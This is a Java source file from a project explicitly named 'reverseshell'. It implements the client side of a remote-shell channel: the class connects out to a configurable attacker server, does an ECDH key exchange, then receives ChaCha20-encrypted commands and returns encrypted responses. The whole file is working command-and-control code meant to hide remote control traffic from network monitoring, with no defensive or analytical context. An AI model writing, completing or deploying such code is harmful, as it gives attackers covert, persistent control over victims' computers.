package obs1d1anc1ph3r.reverseshell;

import obs1d1anc1ph3r.reverseshell.encryption.ECDHKeyExchange;
import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;

import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ServerConnection {

	private final String serverIp;
	private final int serverPort;
	private Socket socket;
	private DataInputStream textIn;
	private DataOutputStream dataOut;
	private byte[] encryptionKey;
	private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());

	private final byte[] privateKey;
	private final byte[] publicKey;

	public ServerConnection(String serverIp, int serverPort) {
		this.serverIp = serverIp;
		this.serverPort = serverPort;

		this.privateKey = ECDHKeyExchange.generatePrivateKey();
		this.publicKey = ECDHKeyExchange.generatePublicKey(privateKey);
	}

	public synchronized void connect() throws IOException {
		try {
			System.out.println("[-] Connecting to server...");
			socket = new Socket();
			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
			System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
			textIn = new DataInputStream(socket.getInputStream());
			dataOut = new DataOutputStream(socket.getOutputStream());

			sendPublicKey();
			byte[] clientPublicKey = receivePublicKey();

			if (clientPublicKey == null || clientPublicKey.length == 0) {
				throw new IOException("Invalid or empty public key received.");
			}

			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(privateKey, clientPublicKey);

			System.out.println("[-*] Encryption key established.");
		} catch (UnknownHostException e) {
			logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
			cleanup();
			throw new IOException("Unknown host: " + e.getMessage(), e);
		} catch (IOException e) {
			logger.log(Level.SEVERE, "IO error occurred while connecting: {0}", e.getMessage());
			cleanup();
			throw e;
		}
	}

	private void sendPublicKey() throws IOException {
		dataOut.writeInt(publicKey.length);
		dataOut.write(publicKey);
		dataOut.flush();
	}

	private byte[] receivePublicKey() throws IOException {
		int length = textIn.readInt();
		if (length <= 0 || length > 256) {
			throw new IOException("Invalid public key length received.");
		}
		byte[] publicKeyServer = new byte[length];
		textIn.readFully(publicKeyServer);
		return publicKeyServer;
	}

	public String readCommand() throws IOException {
		int length = textIn.readInt();
		if (length <= 12) {
			throw new IOException("Invalid encrypted command length.");
		}

		byte[] nonce = new byte[12];
		byte[] encryptedCommand = new byte[length - 12];

		textIn.readFully(nonce);
		textIn.readFully(encryptedCommand);

		try {
			byte[] decryptedCommand = ChaCha20.decrypt(encryptionKey, nonce, encryptedCommand);
			return ChaCha20.bytesToString(decryptedCommand);
		} catch (Exception e) {
			throw new IOException("Failed to decrypt command", e);
		}
	}

	public void sendEncryptedResponse(String response) throws IOException, Exception {
		byte[] nonce = new byte[12];
		new SecureRandom().nextBytes(nonce);

		byte[] encryptedResponse = ChaCha20.encrypt(encryptionKey, nonce, ChaCha20.stringToBytes(response));

		dataOut.writeInt(nonce.length + encryptedResponse.length);
		dataOut.write(nonce);
		dataOut.write(encryptedResponse);
		dataOut.flush();
	}

	public String receiveEncryptedResponse() throws IOException {
		int length = textIn.readInt();
		if (length <= 12) {
			throw new IOException("Invalid encrypted response length.");
		}

		byte[] nonce = new byte[12];
		byte[] encryptedResponse = new byte[length - 12];

		textIn.readFully(nonce);
		textIn.readFully(encryptedResponse);

		try {
			byte[] decryptedResponse = ChaCha20.decrypt(encryptionKey, nonce, encryptedResponse);
			return ChaCha20.bytesToString(decryptedResponse);
		} catch (Exception e) {
			throw new IOException("Failed to decrypt response", e);
		}
	}

	public DataOutputStream getDataOut() {
		return dataOut;
	}

	public byte[] getSessionKey() {
		return encryptionKey;
	}

	public synchronized void cleanup() {
		try {
			if (textIn != null) {
				textIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (socket != null) {
				socket.close();
			}
			System.out.println("[*] Resources cleaned up successfully.");
		} catch (IOException e) {
			logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
		}
	}
}
